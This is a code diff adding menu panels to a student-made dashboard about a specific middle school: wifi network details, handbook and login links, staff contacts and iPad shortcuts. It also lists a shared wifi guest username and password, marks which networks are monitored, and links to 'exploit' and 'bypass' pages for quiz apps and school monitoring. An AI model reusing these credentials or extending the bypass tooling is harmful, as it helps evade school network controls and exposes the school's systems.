@@ -975,7 +975,7 @@
     .error-log-entry {
         padding: 10px;
         background: var(--primary-bg); /* Added background color */
-        border-left: 4px solid var(--error-color);
+        border-left: 44px solid var(--error-color);
         margin-bottom: 10px;
         border-radius: 6px;
         font-size: 12px;
@@ -1267,6 +1267,125 @@
       box-shadow: 0 4px 12px rgba(255, 69, 0, 0.3);
     }
 
+    /* New styles for the main menu buttons */
+    .main-menu-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 15px;
+      margin-top: 20px;
+      margin-bottom: 30px; /* Space before the panels grid */
+    }
+
+    .main-menu-btn {
+      background: var(--secondary-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 10px;
+      padding: 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--text-primary);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100px;
+    }
+
+    .main-menu-btn i {
+      font-size: 32px;
+      color: var(--accent-color);
+      margin-bottom: 10px;
+    }
+
+    .main-menu-btn:hover {
+      background: var(--accent-color);
+      color: white;
+      transform: translateY(-5px);
+      box-shadow: 0 8px 20px rgba(var(--accent-color), 0.3);
+    }
+
+    .main-menu-btn:hover i {
+      color: white;
+    }
+
+    /* Style for wifi info board */
+    .wifi-info-board {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 15px;
+      margin-top: 20px;
+    }
+
+    .wifi-network-card {
+      background: var(--primary-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 10px;
+      padding: 15px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .wifi-network-card h4 {
+      font-size: 1.1em;
+      font-weight: bold;
+      color: var(--accent-color);
+      margin-bottom: 10px;
+    }
+
+    .wifi-network-card div {
+      display: flex;
+      justify-content: space-between;
+      padding: 3px 0;
+      border-bottom: 1px dashed var(--border-color);
+      font-size: 0.9em;
+    }
+
+    .wifi-network-card div:last-child {
+      border-bottom: none;
+    }
+
+    .wifi-network-card span:first-child {
+      font-weight: 500;
+      color: var(--text-secondary);
+    }
+    .wifi-network-card span:last-child {
+      color: var(--text-primary);
+    }
+
+    /* Basic styling for text popups */
+    .text-popup-content {
+      background: var(--primary-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 10px;
+      padding: 20px;
+      margin-top: 15px;
+      max-height: 400px;
+      overflow-y: auto;
+      color: var(--text-primary);
+      line-height: 1.6;
+    }
+
+    .text-popup-content h3 {
+      font-size: 1.2em;
+      color: var(--accent-color);
+      margin-bottom: 10px;
+    }
+
+    .text-popup-content ul {
+        list-style-type: disc;
+        margin-left: 20px;
+    }
+    .text-popup-content ol {
+        list-style-type: decimal;
+        margin-left: 20px;
+    }
+    .text-popup-content a {
+        color: var(--accent-secondary);
+        text-decoration: underline;
+    }
 
     /* Responsive */
     @media (max-width: 1200px) {
@@ -1304,6 +1423,9 @@
       
       .search-container {
         max-width: 100%;
+      }
+      .main-menu-grid {
+          grid-template-columns: 1fr;
       }
     }
 
@@ -1511,6 +1633,55 @@
       <div class="announcement-content">
           <p id="announcementText">Important System Announcement: Scheduled maintenance this weekend. System may experience brief interruptions. Please save your work regularly!</p>
       </div>
+  </div>
+
+  <!-- New Main Menu Buttons Section -->
+  <div class="main-menu-grid">
+    <button class="main-menu-btn" onclick="togglePanel('schoolWifiInfoModal')">
+      <i class="fas fa-wifi"></i> School Wifi Information
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('ipadRestrictionsModal')">
+      <i class="fas fa-tablet-alt"></i> School iPad Restrictions
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('studentHandbooksInfoModal')">
+      <i class="fas fa-book-open"></i> Student Handbooks Information
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('schoolBuildingMapInfoModal')">
+      <i class="fas fa-map-marked-alt"></i> School Building Map Information
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('studentWebsitesInfoModal')">
+      <i class="fas fa-globe"></i> Student Websites Information
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('teacherWebsitesInfoModal')">
+      <i class="fas fa-chalkboard-teacher"></i> Teacher Websites Information
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('schoolPhoneDirectoryInfoModal')">
+      <i class="fas fa-phone-alt"></i> School Phone Directory Information
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('schoolCameraInfoModal')">
+      <i class="fas fa-video"></i> School Camera Information
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('schoolInfoModal')">
+      <i class="fas fa-school"></i> School Information
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('exploitingToolsModal')">
+      <i class="fas fa-tools"></i> Exploiting Tools
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('bypassingToolsModal')">
+      <i class="fas fa-user-secret"></i> Bypassing Tools
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('vpnWebsitesModal')">
+      <i class="fas fa-shield-alt"></i> VPN Websites
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('gamingWebsitesModal')">
+      <i class="fas fa-gamepad"></i> Gaming Websites
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('musicWebsitesModal')">
+      <i class="fas fa-music"></i> Music Websites
+    </button>
+    <button class="main-menu-btn" onclick="togglePanel('keyboardTricksModal')">
+      <i class="fas fa-keyboard"></i> Keyboard Tricks
+    </button>
   </div>
 
   <!-- Main Panels Grid -->
@@ -2092,6 +2263,492 @@
       </div>
     </div>
   </div>
+
+
+  <!-- NEW MODALS FOR USER-REQUESTED BUTTONS -->
+
+  <!-- School Wifi Information Modal -->
+  <div id="schoolWifiInfoModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-wifi"></i> School Wifi Information</h2>
+        <button onclick="togglePanel('schoolWifiInfoModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="wifi-info-board">
+        <!-- Middletown_Core -->
+        <div class="wifi-network-card">
+          <h4>Middletown_Core</h4>
+          <div><span>Network Name:</span> <span>Middletown_Core</span></div>
+          <div><span>Wifi Level:</span> <span>Main</span></div>
+          <div><span>Wifi Security Type:</span> <span>WPA3 Enterprise</span></div>
+          <div><span>Wifi Encryption Type:</span> <span>High</span></div>
+          <div><span>Hidden?:</span> <span>No</span></div>
+          <div><span>Monitored?:</span> <span>Yes</span></div>
+          <div><span>Username:</span> <span>Unknown</span></div>
+          <div><span>Password:</span> <span>Unknown</span></div>
+        </div>
+        <!-- Mtown_Core -->
+        <div class="wifi-network-card">
+          <h4>Mtown_Core</h4>
+          <div><span>Network Name:</span> <span>Mtown_Core</span></div>
+          <div><span>Wifi Level:</span> <span>Main Backup</span></div>
+          <div><span>Wifi Security Type:</span> <span>WPA3 Enterprise</span></div>
+          <div><span>Wifi Encryption Type:</span> <span>High</span></div>
+          <div><span>Hidden?:</span> <span>Yes</span></div>
+          <div><span>Monitored?:</span> <span>Unknown</span></div>
+          <div><span>Username:</span> <span>Unknown</span></div>
+          <div><span>Password:</span> <span>Unknown</span></div>
+        </div>
+        <!-- Mtown Guest -->
+        <div class="wifi-network-card">
+          <h4>Mtown Guest</h4>
+          <div><span>Network Name:</span> <span>Mtown Guest</span></div>
+          <div><span>Wifi Level:</span> <span>Guest Main</span></div>
+          <div><span>Wifi Security Type:</span> <span>WPA3 Enterprise</span></div>
+          <div><span>Wifi Encryption Type:</span> <span>Medium</span></div>
+          <div><span>Hidden?:</span> <span>No</span></div>
+          <div><span>Monitored?:</span> <span>Rare</span></div>
+          <div><span>Username:</span> <span>msguest</span></div>
+          <div><span>Password:</span> <span>M@ms2021#</span></div>
+        </div>
+        <!-- Radius Test -->
+        <div class="wifi-network-card">
+          <h4>Radius Test</h4>
+          <div><span>Network Name:</span> <span>Radius Test</span></div>
+          <div><span>Wifi Level:</span> <span>Testing Main</span></div>
+          <div><span>Wifi Security Type:</span> <span>WPA3 Enterprise</span></div>
+          <div><span>Wifi Encryption Type:</span> <span>Low</span></div>
+          <div><span>Hidden?:</span> <span>No</span></div>
+          <div><span>Monitored?:</span> <span>Rarely</span></div>
+          <div><span>Username:</span> <span>msguest</span></div>
+          <div><span>Password:</span> <span>M@ms2021#</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- School iPad Restrictions Modal -->
+  <div id="ipadRestrictionsModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-tablet-alt"></i> School iPad Restrictions</h2>
+        <button onclick="togglePanel('ipadRestrictionsModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <button class="quick-btn w-full" onclick="toggleSubPanel('ipadRestrictionsText', 'Restrictions')">
+          <i class="fas fa-ban"></i> Restrictions
+        </button>
+        <button class="quick-btn w-full" onclick="toggleSubPanel('ipadBypassesText', 'Bypasses')">
+          <i class="fas fa-unlock-alt"></i> Bypasses
+        </button>
+      </div>
+      <div id="ipadRestrictionsText" class="text-popup-content mt-4 hidden">
+          <h3>Restrictions</h3>
+          <p>Coming soon</p>
+      </div>
+      <div id="ipadBypassesText" class="text-popup-content mt-4 hidden">
+          <h3>Bypasses</h3>
+          <p>Coming soon</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Student Handbooks Information Modal -->
+  <div id="studentHandbooksInfoModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-book-open"></i> Student Handbooks Information</h2>
+        <button onclick="togglePanel('studentHandbooksInfoModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+        <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank" class="quick-btn text-center flex-grow">
+          <i class="fas fa-file-pdf"></i> Elementary Handbook (Jan 2025)
+        </a>
+        <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank" class="quick-btn text-center flex-grow">
+          <i class="fas fa-file-pdf"></i> Secondary Student Handbook (Jan 2025)
+        </a>
+        <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank" class="quick-btn text-center flex-grow">
+          <i class="fas fa-file-pdf"></i> District Handbook
+        </a>
+        <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank" class="quick-btn text-center flex-grow">
+          <i class="fas fa-file-pdf"></i> RA Academy Handbook (Jan 2025)
+        </a>
+        <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank" class="quick-btn text-center flex-grow">
+          <i class="fas fa-file-pdf"></i> Virtual Learning Plan (2024 - 2025)
+        </a>
+        <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank" class="quick-btn text-center flex-grow">
+          <i class="fas fa-file-pdf"></i> Dress Code (2024 - 2025)
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <!-- School Building Map Information Modal -->
+  <div id="schoolBuildingMapInfoModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-map-marked-alt"></i> School Building Map Information</h2>
+        <button onclick="togglePanel('schoolBuildingMapInfoModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="text-popup-content">
+          <h3>Building Map Display</h3>
+          <p>Building Map Coming Soon</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Student Website's Information Modal -->
+  <div id="studentWebsitesInfoModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-globe"></i> Student Websites Information</h2>
+        <button onclick="togglePanel('studentWebsitesInfoModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="text-popup-content">
+          <h3>Student Resources</h3>
+          <ul>
+              <li><a href="https://www.raiderweb.org" target="_blank">https://www.raiderweb.org</a></li>
+              <li><a href="https://middletownsd.instructure.com/login" target="_blank">https://middletownsd.instructure.com/login</a></li>
+              <li><a href="https://caresolace.com/site/middletownarea" target="_blank">https://caresolace.com/site/middletownarea</a></li>
+              <li><a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">https://clever.com/oauth/authorize?...</a></li>
+              <li><a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">https://sso.rumba.pk12ls.com/...</a></li>
+              <li><a href="https://myhealthyzone.fitnessgram.net" target="_blank">https://myhealthyzone.fitnessgram.net</a></li>
+              <li><a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">https://www.raiderweb.org/student_services/hazing_reporting</a></li>
+              <li><a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">https://www.youtube.com/user/MAHSAnnouncements?app=desktop</a></li>
+              <li><a href="https://id.naviance.com" target="_blank">https://id.naviance.com</a></li>
+              <li><a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">https://raiderweb.follettdestiny.com/portal/...</a></li>
+              <li><a href="https://powerschool.raiderweb.org/public/" target="_blank">https://powerschool.raiderweb.org/public/</a></li>
+              <li><a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">https://idp-awsprod1.education.scholastic.com/idp/</a></li>
+              <li><a href="https://www.safe2saypa.org" target="_blank">https://www.safe2saypa.org</a></li>
+              <li><a href="https://mail.google.com/mail/" target="_blank">https://mail.google.com/mail/</a></li>
+              <li><a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">https://www.balfour.com/pennsylvania/middletown/...</a></li>
+              <li><a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">https://raiderweb.linkit.com/Account/LogOn?...</a></li>
+          </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Teacher Websites Information Modal -->
+  <div id="teacherWebsitesInfoModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-chalkboard-teacher"></i> Teacher Websites Information</h2>
+        <button onclick="togglePanel('teacherWebsitesInfoModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="text-popup-content">
+          <h3>Teacher Resources</h3>
+          <ul>
+              <li><a href="https://alo.acadiencelearning.org/login" target="_blank">https://alo.acadiencelearning.org/login</a></li>
+              <li><a href="https://app.aimswebplus.com/#/login" target="_blank">https://app.aimswebplus.com/#/login</a></li>
+              <li><a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">https://ep1.erplinq.com/MIDDLETOWN/</a></li>
+              <li><a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">https://sso.barracuda.com/...</a></li>
+              <li><a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">https://shop.buyguernsey.com/thmBootstrapHome.aspx</a></li>
+              <li><a href="https://middletownsd.instructure.com/login/ldap" target="_blank">https://middletownsd.instructure.com/login/ldap</a></li>
+              <li><a href="https://caresolace.com/site/middletownarea" target="_blank">https://caresolace.com/site/middletownarea</a></li>
+              <li><a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">https://clever.com/oauth/authorize?...</a></li>
+              <li><a href="https://www.discoveryeducation.com" target="_blank">https://www.discoveryeducation.com</a></li>
+              <li><a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">https://sso.rumba.pk12ls.com/...</a></li>
+              <li><a href="https://raiderweb.gofmx.com/login" target="_blank">https://raiderweb.gofmx.com/login</a></li>
+              <li><a href="https://myhealthyzone.fitnessgram.net" target="_blank">https://myhealthyzone.fitnessgram.net</a></li>
+              <li><a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">https://login.frontlineeducation.com/...</a></li>
+              <li><a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">https://raiderweb.linkit.com/Account/LogOn?...</a></li>
+              <li><a href="https://id.naviance.com" target="_blank">https://id.naviance.com</a></li>
+              <li><a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">https://raiderweb.follettdestiny.com/portal/...</a></li>
+              <li><a href="https://paetep.edulinksolutions.com/login" target="_blank">https://paetep.edulinksolutions.com/login</a></li>
+              <li><a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">https://powerschool.raiderweb.org/teachers/pw.html</a></li>
+              <li><a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">https://idp-awsprod1.education.scholastic.com/idp/</a></li>
+              <li><a href="https://go.schoolmessenger.com/#/home" target="_blank">https://go.schoolmessenger.com/#/home</a></li>
+              <li><a href="https://www.pdesas.org/standard/" target="_blank">https://www.pdesas.org/standard/</a></li>
+              <li><a href="https://www.pbisapps.org" target="_blank">https://www.pbisapps.org</a></li>
+              <li><a href="https://masd.happyfox.com/home/" target="_blank">https://masd.happyfox.com/home/</a></li>
+              <li><a href="https://middletownasd-pa.safeschools.com/login" target="_blank">https://middletownasd-pa.safeschools.com/login</a></li>
+              <li><a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b"id_token"%3a%7b"xms_cc"%3a%7b"values"%3a%5b"CP1"%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">https://login.microsoftonline.com/...</a></li>
+          </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- School Phone Directory Information Modal -->
+  <div id="schoolPhoneDirectoryInfoModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-phone-alt"></i> School Phone Directory Information</h2>
+        <button onclick="togglePanel('schoolPhoneDirectoryInfoModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="text-popup-content">
+          <h3>Teacher Directory</h3>
+          <p>Teachers name: [N/A]</p>
+          <p>Room Number: [N/A]</p>
+          <p>Call ID: [N/A]</p>
+          <p class="mt-4 text-yellow-400">Update Coming Soon!</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- School Camera Information Modal -->
+  <div id="schoolCameraInfoModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-video"></i> School Camera Information</h2>
+        <button onclick="togglePanel('schoolCameraInfoModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="text-popup-content">
+          <p>Update Coming Soon</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- School Information Modal -->
+  <div id="schoolInfoModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-school"></i> School Information</h2>
+        <button onclick="togglePanel('schoolInfoModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="text-popup-content">
+          <p><strong>School Name:</strong> Middletown Area Middle School</p>
+          <p><strong>School Address:</strong> 215 Oberlin Road Middletown, PA 17057</p>
+          <p><strong>School Phone:</strong> 717-930-0739</p>
+          <p><strong>School Fax:</strong> 717-944-0591</p>
+          <br>
+          <p><strong>School Principal:</strong> Dr. Shannon L. Wevodau</p>
+          <p><strong>Principal's Phone:</strong> 717-930-0739</p>
+          <p><strong>Principal's Email:</strong> swevodau@raiderweb.org</p>
+          <br>
+          <p><strong>Assistant Principal:</strong> Mr. Michael DeFilippo</p>
+          <p><strong>Assistant Principal's Phone:</strong> 717-930-0739</p>
+          <p><strong>Assistant Principal's Email:</strong> mdefilippo@raiderweb.org</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Exploiting Tools Modal -->
+  <div id="exploitingToolsModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-tools"></i> Exploiting Tools</h2>
+        <button onclick="togglePanel('exploitingToolsModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
+        <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="quick-btn text-center flex-grow">
+          Blooket Exploit
+        </a>
+        <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="quick-btn text-center flex-grow">
+          Kahoot Exploit
+        </a>
+        <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="quick-btn text-center flex-grow">
+          Gimkit Exploit
+        </a>
+        <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="quick-btn text-center flex-grow">
+          Quizlet Exploit
+        </a>
+        <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="quick-btn text-center flex-grow">
+          Quizzes Exploit
+        </a>
+        <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="quick-btn text-center flex-grow">
+          Quills Exploit
+        </a>
+        <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="quick-btn text-center flex-grow">
+          Edpuzzle Exploit
+        </a>
+        <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="quick-btn text-center flex-grow">
+          Nearpod Exploit
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bypassing Tools Modal -->
+  <div id="bypassingToolsModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-user-secret"></i> Bypassing Tools</h2>
+        <button onclick="togglePanel('bypassingToolsModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <button class="quick-btn w-full" onclick="toggleSubPanel('bathroomBypassText', 'Bathroom Bypass')">
+          Bathroom Bypass
+        </button>
+        <button class="quick-btn w-full" onclick="toggleSubPanel('wifiBypassText', 'Wifi Bypass')">
+          Wifi Bypass
+        </button>
+        <button class="quick-btn w-full" onclick="toggleSubPanel('teacherMonitoringBypassText', 'Teacher Monitoring Bypass')">
+          Teacher Monitering Bypass
+        </button>
+        <button class="quick-btn w-full" onclick="toggleSubPanel('comingSoon1', 'Coming Soon')">
+          Coming Soon
+        </button>
+        <button class="quick-btn w-full" onclick="toggleSubPanel('comingSoon2', 'Coming Soon')">
+          Coming Soon
+        </button>
+        <button class="quick-btn w-full" onclick="toggleSubPanel('comingSoon3', 'Coming Soon')">
+          Coming Soon
+        </button>
+      </div>
+      <div id="bathroomBypassText" class="text-popup-content mt-4 hidden">
+          <h3>Bathroom Bypass</h3>
+          <p>COMING SOON</p>
+      </div>
+      <div id="wifiBypassText" class="text-popup-content mt-4 hidden">
+          <h3>Wifi Bypass</h3>
+          <p>Go to School Wifi Information</p>
+      </div>
+      <div id="teacherMonitoringBypassText" class="text-popup-content mt-4 hidden">
+          <h3>Teacher Monitoring Bypass</h3>
+          <p>COMING SOON</p>
+      </div>
+      <div id="comingSoon1" class="text-popup-content mt-4 hidden">
+          <h3>Coming Soon</h3>
+          <p>COMING SOON</p>
+      </div>
+      <div id="comingSoon2" class="text-popup-content mt-4 hidden">
+          <h3>Coming Soon</h3>
+          <p>COMING SOON</p>
+      </div>
+      <div id="comingSoon3" class="text-popup-content mt-4 hidden">
+          <h3>Coming Soon</h3>
+          <p>COMING SOON</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- VPN Websites Modal -->
+  <div id="vpnWebsitesModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-shield-alt"></i> VPN Websites</h2>
+        <button onclick="togglePanel('vpnWebsitesModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="text-popup-content">
+          <h3>Recommended VPNs</h3>
+          <p>Coming soon...</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Gaming Websites Modal -->
+  <div id="gamingWebsitesModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-gamepad"></i> Gaming Websites</h2>
+        <button onclick="togglePanel('gamingWebsitesModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="text-popup-content">
+          <p>COMING SOON</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Music Websites Modal -->
+  <div id="musicWebsitesModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-music"></i> Music Websites</h2>
+        <button onclick="togglePanel('musicWebsitesModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="text-popup-content">
+          <p>COMING SOON</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Keyboard Tricks Modal -->
+  <div id="keyboardTricksModal" class="settings-modal">
+    <div class="settings-content">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-keyboard"></i> Keyboard Tricks</h2>
+        <button onclick="togglePanel('keyboardTricksModal')" class="text-2xl text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="text-popup-content">
+          <h3>System Shortcuts: coming soon!</h3>
+          <ul>
+            <li>Access Spotlight Search: Press Command (⌘) + Space bar.</li>
+            <li>Return to the Home screen: Press Command (⌘) + H.</li>
+            <li>Show the Dock: Press Command (⌘) + Option (⌥) + D.</li>
+            <li>Show the App Library: Press Shift (⇧) + Globe + A.</li>
+            <li>Open Quick Note: Press Globe + Q.</li>
+            <li>Open Siri: Press Globe + S.</li>
+            <li>Open Control Center: Press Globe + C.</li>
+            <li>Open Notification Center: Press Globe + N.</li>
+            <li>Show all windows: Press Globe + Down Arrow.</li>
+            <li>Open the App Switcher: Press Globe + Up Arrow.</li>
+          </ul>
+          <h3>Multitasking Shortcuts:</h3>
+          <ul>
+            <li>Switch to the last active app: Press Command (⌘) + Tab.</li>
+            <li>View all active apps: Press and hold Command (⌘) + Tab.</li>
+            <li>Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.</li>
+            <li>Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.</li>
+            <li>Open Slide Over: Press Globe + Backslash.</li>
+            <li>Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.</li>
+          </ul>
+          <h3>Safari and App-Specific Shortcuts:</h3>
+          <ul>
+            <li>Take a full-screen screenshot: Press Command (⌘) + Shift + 3.</li>
